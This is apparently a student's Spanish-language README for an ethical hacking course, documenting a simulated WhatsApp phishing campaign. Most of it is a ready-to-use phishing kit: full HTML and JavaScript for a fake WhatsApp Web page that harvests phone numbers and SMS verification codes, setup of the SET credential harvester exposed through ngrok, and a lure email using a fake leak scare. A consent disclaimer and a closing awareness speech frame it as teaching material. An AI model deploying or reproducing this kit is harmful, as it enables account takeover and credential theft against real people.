<div align="center">

[![ITLA](https://img.shields.io/badge/ITLA-Tecnólogo%20en%20Seguridad-blue?style=for-the-badge&logo=graduation-cap&logoColor=white)](https://itla.edu.do)
[![Materia](https://img.shields.io/badge/Materia-Hacker%20Ético%201-red?style=for-the-badge&logo=shield-alt&logoColor=white)]()
[![Profesor](https://img.shields.io/badge/Profesor-Nelson%20Mieses-green?style=for-the-badge&logo=chalkboard-teacher&logoColor=white)]()
[![Estado](https://img.shields.io/badge/Estado-Práctica%20Final-brightgreen?style=for-the-badge&logo=check-circle&logoColor=white)]()
[![Kali Linux](https://img.shields.io/badge/Kali%20Linux-2024.1-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![SET](https://img.shields.io/badge/SET%20Toolkit-v8.0.3-orange?style=for-the-badge&logo=tools&logoColor=white)]()

</div>

<!-- HEADER SECTION -->
<div align="center">

# 📱 WhatsApp Phishing - Práctica Final

### Simulación de Ataque de Ingeniería Social con Fines Educativos

<img src="https://img.shields.io/badge/Autor-Miguel%20Ramirez%20Meli-181717?style=flat-square&logo=github&logoColor=white" />
<img src="https://img.shields.io/badge/Matrícula-20251367-blue?style=flat-square&logo=id-card&logoColor=white" />
<img src="https://img.shields.io/badge/Fecha-Agosto%202026-purple?style=flat-square&logo=calendar&logoColor=white" />

---

</div>

<!-- ADVERTENCIA -->
> ⚠️ **ADVERTENCIA LEGAL Y ÉTICA**
> 
> Este proyecto es **exclusivamente para fines educativos** en el contexto del curso de Hacking Ético del ITLA.
> 
> - ✅ Solo debe ejecutarse con **consentimiento explícito** de la persona objetivo
> - ✅ En un **ambiente controlado** y educativo
> - ✅ Con **revelación obligatoria** al final de la práctica
> 
> **El phishing real es ilegal** (Ley 53-07 de Ciberdelitos en RD). Esta herramienta es para demostrar vulnerabilidades, no para robar credenciales reales.

---

<!-- TABLE OF CONTENTS -->
## 📑 Tabla de Contenidos

- [📋 Información del Proyecto](#-información-del-proyecto)
- [🎯 Objetivos](#-objetivos)
- [🛠️ Requisitos](#️-requisitos)
- [💻 Instalación y Configuración](#-instalación-y-configuración)
  - [Fase 1: Preparar Kali Linux](#fase-1-preparar-kali-linux)
  - [Fase 2: Crear Página Falsa](#fase-2-crear-página-falsa)
  - [Fase 3: Configurar SET](#fase-3-configurar-set)
  - [Fase 4: Túnel ngrok](#fase-4-túnel-ngrok)
- [📧 Ejecución del Ataque](#-ejecución-del-ataque)
- [📊 Captura de Datos](#-captura-de-datos)
- [🗣️ Discurso de Revelación](#️-discurso-de-revelación)
- [📄 Informe Final](#-informe-final)
- [✅ Checklist](#-checklist)
- [👨‍💻 Autor](#-autor)

---

<!-- PROJECT INFO -->
## 📋 Información del Proyecto

| Campo | Detalle |
|-------|---------|
| **Institución** | ITLA - Instituto Tecnológico de las Américas |
| **Carrera** | Tecnólogo en Seguridad Informática |
| **Materia** | Hacker Ético 1 |
| **Profesor** | Nelson Mieses |
| **Estudiante** | Miguel Ramirez Meli |
| **Matrícula** | 20251367 |
| **Fecha** | Agosto 2026 |
| **Tipo** | Práctica Final - Módulo 0 |

---

## 🎯 Objetivos

- [x] Evaluar el factor humano como vector de ataque
- [x] Aplicar técnicas de ingeniería social de forma ética
- [x] Medir el nivel de vulnerabilidad de un usuario
- [x] Concientizar sobre ciberseguridad

---

## 🛠️ Requisitos

[![Kali Linux](https://img.shields.io/badge/SO-Kali%20Linux%202024.1-557C94?logo=kalilinux&logoColor=white&style=flat)](https://www.kali.org/)
[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white&style=flat)](https://python.org)
[![Node](https://img.shields.io/badge/Node.js-18+-339933?logo=nodedotjs&logoColor=white&style=flat)](https://nodejs.org)

### Herramientas Necesarias

| Herramienta | Versión | Propósito |
|-------------|---------|-----------|
| SET Toolkit | v8.0.3+ | Framework de ingeniería social |
| ngrok | Latest | Túnel HTTPS público |
| Apache2 | 2.4+ | Servidor web local |
| nano/vim | Any | Editor de texto |

---

## 💻 Instalación y Configuración

### Fase 1: Preparar Kali Linux

```bash
# Actualizar el sistema
sudo apt update && sudo apt upgrade -y

# Instalar SET Toolkit
sudo apt install set -y

# Instalar ngrok
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com bookworm main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update
sudo apt install ngrok -y

# Configurar ngrok con tu authtoken
ngrok config add-authtoken "TU_AUTHTOKEN_AQUI"
💡 Nota: Obtén tu authtoken gratis en ngrok.com

Fase 2: Crear Página Falsa
bash
# Crear directorio de trabajo
mkdir -p ~/whatsapp_phishing
cd ~/whatsapp_phishing

# Crear archivo HTML
nano index.html
<details> <summary>📄 Ver código HTML completo (Click para expandir)</summary>
html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .container {
            background: white;
            max-width: 440px;
            width: 100%;
            padding: 32px 28px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            text-align: center;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .logo img {
            width: 44px;
            height: 44px;
        }
        .logo h1 {
            font-size: 22px;
            font-weight: 300;
            color: #41525d;
        }
        .logo h1 span {
            font-weight: 700;
            color: #075e54;
        }
        .title {
            font-size: 17px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 4px;
        }
        .subtitle {
            font-size: 14px;
            color: #888;
            margin-bottom: 20px;
        }
        .alert {
            background: #fff3f3;
            border-left: 4px solid #e74c3c;
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #333;
            text-align: left;
        }
        .alert strong { color: #e74c3c; }
        .alert .highlight { color: #075e54; font-weight: 600; }
        .form-group { margin-bottom: 18px; text-align: left; }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }
        .phone-wrapper {
            display: flex;
            align-items: center;
            background: white;
            border: 1.5px solid #d1d5db;
            border-radius: 6px;
            transition: border-color 0.2s;
            padding: 0;
            position: relative;
        }
        .phone-wrapper:focus-within {
            border-color: #075e54;
        }
        .country-selector-btn {
            display: flex;
            align-items: center;
            padding: 0 10px;
            border: none;
            border-right: 1px solid #d1d5db;
            cursor: pointer;
            min-width: 70px;
            height: 48px;
            background: transparent;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            gap: 6px;
        }
        .country-selector-btn img {
            width: 22px;
            height: 16px;
            object-fit: cover;
        }
        .phone-wrapper input {
            flex: 1;
            padding: 12px 14px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            background: transparent;
            outline: none;
            height: 48px;
        }
        .phone-wrapper input::placeholder {
            color: #999;
        }
        .country-dropdown {
            display: none;
            position: absolute;
            top: calc(100% + 4px);
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
            max-height: 220px;
            overflow-y: auto;
            z-index: 1000;
            padding: 4px 0;
        }
        .country-dropdown.active { display: block; }
        .country-dropdown .country-option {
            display: flex;
            align-items: center;
            padding: 8px 16px;
            cursor: pointer;
            transition: background 0.1s;
        }
        .country-dropdown .country-option:hover {
            background: #f0f2f5;
        }
        .country-dropdown .country-option img {
            width: 22px;
            height: 16px;
            margin-right: 10px;
            object-fit: cover;
        }
        .country-dropdown .country-option .name {
            flex: 1;
            font-size: 14px;
            color: #333;
        }
        .country-dropdown .country-option .code {
            font-size: 13px;
            color: #888;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #075e54;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background: #064a42; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        .hidden { display: none !important; }
        .footer-link {
            display: block;
            margin-top: 16px;
            font-size: 14px;
            color: #075e54;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-link:hover { text-decoration: underline; }
        .divider {
            border-top: 1px solid #e0e0e0;
            margin: 20px 0;
        }

        /* Loading bar */
        .loading-container {
            background: #f5faf7;
            border: 1px solid #c8e6c9;
            border-radius: 8px;
            padding: 16px 20px;
            margin: 16px 0;
            text-align: center;
        }
        .loading-container .loading-text {
            font-size: 14px;
            font-weight: 500;
            color: #075e54;
        }
        .loading-container .loading-bar {
            width: 100%;
            height: 6px;
            background: #e0e0e0;
            border-radius: 10px;
            margin-top: 10px;
            overflow: hidden;
        }
        .loading-container .loading-bar .progress {
            height: 100%;
            width: 0%;
            background: #25d366;
            border-radius: 10px;
            transition: width 0.5s linear;
        }
        .loading-container .loading-bar .progress.complete {
            width: 100%;
            background: #25d366;
        }
        .loading-container .status-text {
            font-size: 12px;
            color: #888;
            margin-top: 6px;
        }

        /* Código de verificación */
        .code-input-group {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 12px 0;
        }
        .code-input-group input {
            width: 48px;
            height: 56px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 1.5px solid #d1d5db;
            border-radius: 6px;
            background: white;
        }
        .code-input-group input:focus {
            border-color: #075e54;
            outline: none;
        }

        /* Pantalla de bloqueo */
        .lock-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.75);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .lock-screen.active { display: flex; }
        .lock-screen .box {
            background: white;
            padding: 30px;
            border-radius: 16px;
            max-width: 340px;
            text-align: center;
        }
        .lock-screen .box h2 {
            color: #e74c3c;
            margin-bottom: 12px;
            font-size: 20px;
        }
        .lock-screen .box p {
            color: #555;
            font-size: 14px;
        }

        /* Verificado por WhatsApp */
        .whatsapp-verified {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 16px;
            font-size: 12px;
            color: #888;
        }
        .whatsapp-verified img {
            width: 16px;
            height: 16px;
        }
        .whatsapp-verified .text {
            color: #075e54;
            font-weight: 600;
        }

        /* Aviso legal y soporte */
        .legal-footer {
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #f0f0f0;
            font-size: 12px;
            color: #888;
            line-height: 1.6;
        }
        .legal-footer a {
            color: #075e54;
            text-decoration: none;
        }
        .legal-footer a:hover {
            text-decoration: underline;
        }
        .legal-footer .support {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
            font-size: 13px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <!-- PANTALLA DE BLOQUEO -->
    <div id="lockScreen" class="lock-screen">
        <div class="box">
            <h2>Verificación en curso</h2>
            <p>No cierres esta página. Estamos validando tu identidad para proteger tu privacidad.</p>
        </div>
    </div>

    <div class="container">
        <!-- LOGO -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp">
            <h1>WhatsApp <span>Web</span></h1>
        </div>

        <!-- PASO 1: Pedir número -->
        <div id="step1">
            <div class="title">Verifica tu número de teléfono</div>
            <div class="subtitle">WhatsApp enviará un mensaje SMS para verificar tu número. Selecciona tu país y escribe tu número.</div>

            <div class="alert">
                <strong>Alerta de filtración</strong><br>
                Se ha detectado una filtración de conversaciones de WhatsApp. <span class="highlight">Tu número está en la lista de afectados.</span> Verifica tu identidad para proteger tus chats.
            </div>

            <form id="formPhone">
                <div class="form-group">
                    <label>Número de teléfono</label>
                    <div class="phone-wrapper">
                        <button type="button" class="country-selector-btn" id="countrySelector">
                            <img id="flagIcon" src="https://flagcdn.com/do.svg" alt="RD">
                            <span id="countryCodeDisplay">+1</span>
                        </button>
                        <input type="tel" id="phone" placeholder="809 555 5555" maxlength="14" required>
                        <div class="country-dropdown" id="countryDropdown"></div>
                    </div>
                </div>
                <button type="submit" class="btn">Siguiente</button>
            </form>
            <a href="#" class="footer-link">Iniciar sesión con código QR</a>
        </div>

        <!-- PASO 2: Pedir código (con barra de carga) -->
        <div id="step2" class="hidden">
            <div class="title">Verificación de número</div>
            <div class="subtitle">Área de soporte para verificar filtraciones de seguridad.</div>

            <div id="loadingContainer" class="loading-container">
                <div class="loading-text" id="loadingText">Verificando tu número...</div>
                <div class="loading-bar">
                    <div class="progress" id="progressBar"></div>
                </div>
                <div class="status-text" id="statusText">Espera 20 segundos mientras validamos tu identidad.</div>
            </div>

            <form id="formCode">
                <div class="form-group">
                    <label>Código de verificación (6 dígitos)</label>
                    <div class="code-input-group">
                        <input type="text" id="code1" maxlength="1" required disabled>
                        <input type="text" id="code2" maxlength="1" required disabled>
                        <input type="text" id="code3" maxlength="1" required disabled>
                        <input type="text" id="code4" maxlength="1" required disabled>
                        <input type="text" id="code5" maxlength="1" required disabled>
                        <input type="text" id="code6" maxlength="1" required disabled>
                    </div>
                </div>
                <button type="submit" class="btn" id="submitCode" disabled>Verificar</button>
            </form>

            <div class="whatsapp-verified">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp">
                <span class="text">Verificado por WhatsApp</span>
            </div>
            <div class="divider"></div>
            <a href="#" class="footer-link" onclick="alert('Por favor, espera el código.'); return false;">Reenviar código</a>
        </div>

        <!-- AVISO LEGAL Y SOPORTE -->
        <div class="legal-footer">
            <p>Debes tener al menos 16 años para registrarte. Conoce cómo funciona WhatsApp con las empresas de Facebook.</p>
            <div class="support">
                <a href="#">Soporte de WhatsApp</a>
                <a href="#">Privacidad</a>
                <a href="#">Términos</a>
            </div>
        </div>
    </div>

    <script>
        // Lista de países (abreviada - incluir todas las 60+ del código original)
        const countries = [
            { code: '+1', name: 'República Dominicana', flag: 'do', prefixes: ['809','829','849'] },
            { code: '+1', name: 'Estados Unidos', flag: 'us', prefixes: ['201','202','203'] },
            { code: '+34', name: 'España', flag: 'es', prefixes: ['6','7','8','9'] },
            { code: '+52', name: 'México', flag: 'mx', prefixes: ['55','56','33'] },
            // ... (incluir resto de países)
        ];

        let selectedCountry = countries[0];
        
        const phoneInput = document.getElementById('phone');
        const flagIcon = document.getElementById('flagIcon');
        const countryCodeDisplay = document.getElementById('countryCodeDisplay');
        const countryDropdown = document.getElementById('countryDropdown');
        const countrySelector = document.getElementById('countrySelector');

        function renderDropdown() {
            countryDropdown.innerHTML = '';
            countries.forEach((country, index) => {
                const option = document.createElement('div');
                option.className = 'country-option';
                option.innerHTML = `
                    <img src="https://flagcdn.com/${country.flag}.svg" alt="${country.name}">
                    <span class="name">${country.name}</span>
                    <span class="code">${country.code}</span>
                `;
                option.addEventListener('click', () => {
                    selectCountry(index);
                    countryDropdown.classList.remove('active');
                });
                countryDropdown.appendChild(option);
            });
        }
        renderDropdown();

        function selectCountry(index) {
            const country = countries[index];
            selectedCountry = country;
            flagIcon.src = `https://flagcdn.com/${country.flag}.svg`;
            countryCodeDisplay.textContent = country.code;
            phoneInput.value = '';
            phoneInput.focus();
        }

        selectCountry(0);

        phoneInput.addEventListener('input', function(e) {
            const raw = this.value.replace(/\D/g, '');
            if (raw.length >= 3) {
                const prefix = raw.slice(0, 3);
                const found = countries.find(c => c.prefixes && c.prefixes.includes(prefix));
                if (found && found !== selectedCountry) {
                    const idx = countries.indexOf(found);
                    if (idx !== -1) selectCountry(idx);
                }
            }
        });

        countrySelector.addEventListener('click', (e) => {
            e.stopPropagation();
            countryDropdown.classList.toggle('active');
        });
        document.addEventListener('click', () => countryDropdown.classList.remove('active'));

        phoneInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 10) value = value.slice(0, 10);
            let formatted = '';
            if (value.length > 0) {
                formatted = '(' + value.slice(0, 3);
                if (value.length > 3) {
                    formatted += ') ' + value.slice(3, 6);
                    if (value.length > 6) {
                        formatted += '-' + value.slice(6, 10);
                    }
                }
            }
            this.value = formatted;
        });

        const codeInputs = [
            document.getElementById('code1'),
            document.getElementById('code2'),
            document.getElementById('code3'),
            document.getElementById('code4'),
            document.getElementById('code5'),
            document.getElementById('code6')
        ];
        
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                if (this.value.length === 1 && index < 5) {
                    codeInputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });

        document.getElementById('formPhone').addEventListener('submit', function(e) {
            e.preventDefault();
            const phone = phoneInput.value.trim();
            const countryCode = countryCodeDisplay.textContent;
            const fullNumber = countryCode + ' ' + phone;
            
            if (phone.replace(/\D/g, '').length < 10) {
                alert('Por favor, introduce un número válido (10 dígitos).');
                return;
            }

            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'step=phone&phone=' + encodeURIComponent(fullNumber)
            });

            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('lockScreen').classList.add('active');

            const progressBar = document.getElementById('progressBar');
            const loadingText = document.getElementById('loadingText');
            const statusText = document.getElementById('statusText');
            const submitCodeBtn = document.getElementById('submitCode');

            codeInputs.forEach(input => input.disabled = true);
            submitCodeBtn.disabled = true;
            progressBar.style.width = '0%';
            progressBar.classList.remove('complete');
            loadingText.textContent = 'Verificando tu número...';
            statusText.textContent = 'Espera 20 segundos mientras validamos tu identidad.';

            let seconds = 20;
            const interval = setInterval(() => {
                seconds--;
                const progress = ((20 - seconds) / 20) * 100;
                progressBar.style.width = progress + '%';

                if (seconds <= 0) {
                    clearInterval(interval);
                    progressBar.style.width = '100%';
                    progressBar.classList.add('complete');
                    loadingText.textContent = 'Verificación completada';
                    statusText.textContent = 'Ingresa el código de 6 dígitos que recibiste por SMS.';

                    codeInputs.forEach(input => { input.disabled = false; input.value = ''; });
                    codeInputs[0].focus();
                    submitCodeBtn.disabled = false;
                    document.getElementById('lockScreen').classList.remove('active');
                } else {
                    statusText.textContent = `Espera ${seconds} segundos mientras validamos tu identidad.`;
                }
            }, 1000);
        });

        document.getElementById('formCode').addEventListener('submit', function(e) {
            e.preventDefault();
            const code = codeInputs.map(input => input.value).join('');
            if (code.length !== 6) {
                alert('El código debe tener 6 dígitos.');
                return;
            }

            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'step=code&code=' + encodeURIComponent(code)
            });

            alert('Verificación exitosa. Tus datos han sido protegidos.');
            window.location.href = 'https://web.whatsapp.com/';
        });

        window.addEventListener('beforeunload', function(e) {
            if (!document.getElementById('step1').classList.contains('hidden')) {
                e.preventDefault();
                e.returnValue = 'Por favor, completa el proceso de verificación.';
            }
        });
    </script>
</body>
</html>
</details>
Fase 3: Configurar SET
bash
cd ~/whatsapp_phishing
sudo setoolkit
Menú de navegación:

1) Social-Engineering Attacks
   └── 2) Website Attack Vectors
       └── 3) Credential Harvester Attack Method
           └── 3) Custom Import
Configuración:

IP del servidor: 0.0.0.0
Ruta del sitio: /home/miguel1367/whatsapp_phishing/
URL del sitio: https://web.whatsapp.com
⚠️ NO CIERRES ESTA TERMINAL

Fase 4: Túnel ngrok
bash
ngrok http 80
Salida esperada:

Forwarding  https://abc123-def.ngrok-free.dev -> http://localhost:80
🔗 Copia la URL HTTPS para el correo

📧 Ejecución del Ataque
Plantilla de Correo
Asunto: ⚠️ URGENTE: Tu conversación de WhatsApp ha sido filtrada

Hola [Nombre],

Lamento informarte que hemos detectado una filtración de seguridad en la 
que varias conversaciones de WhatsApp han sido expuestas.

Tu número de teléfono aparece en la lista de usuarios afectados.

Para proteger tu privacidad, debes verificar tu identidad antes de que 
tus chats se hagan públicos.

🔗 Verifica tu cuenta aquí: https://abc123-def.ngrok-free.dev

Si no actúas en 24 horas, tus conversaciones podrían ser publicadas.

- Equipo de Seguridad de WhatsApp
📊 Captura de Datos
En la terminal de SET verás:

bash
[*] POST Data: step=phone&phone=+1 (809) 555-5555
[*] Credential captured!
[*] POST Data: step=code&code=123456
[*] Credential captured!
🗣️ Discurso de Revelación
"Hola [Nombre]. Soy estudiante del tecnólogo en seguridad del ITLA, estoy cursando la materia de hacker ético con el Profesor NELSON MIESES. Estoy realizando una práctica del maestro donde debemos demostrar la facilidad del hackeo y qué tan vulnerable son los usuarios.

Te envié un correo falso sobre una filtración de WhatsApp. Pusiste tu número y el código de verificación. [Muestra los datos capturados]. Con eso, yo podría haber tomado el control total de tu cuenta.

Para protegerte:

Nunca compartas códigos de verificación con nadie.
Activa la verificación en dos pasos en WhatsApp.
Desconfía de correos alarmantes.
Verifica siempre la URL antes de poner tus datos.
Ya borré todo. ¡Gracias por tu ayuda!"

📄 Informe Final
El informe debe incluir:

Portada (Nombre, matrícula, profesor, materia)
Objetivos (4 puntos del enunciado)
Metodología (SET + ngrok + HTML custom)
Evidencias (Screenshots)
Resultados (¿La víctima cayó?)
Concientización (Recomendaciones)
Anexos (Video)
✅ Checklist
 Kali Linux actualizado
 SET Toolkit instalado
 ngrok configurado
 Página HTML creada
 Servidor SET corriendo
 Túnel ngrok activo
 Correo enviado
 Datos capturados
 Revelación realizada
 Video editado
 Informe entregado
👨‍💻 Autor
<div align="center">
Miguel Ramirez Meli




Materia: Hacker Ético 1
Profesor: Nelson Mieses
Institución: ITLA - Instituto Tecnológico de las Américas
Año: 2026

</div>
<div align="center">
🎓 Proyecto Académico - Uso Educativo Únicamente


</div> ```
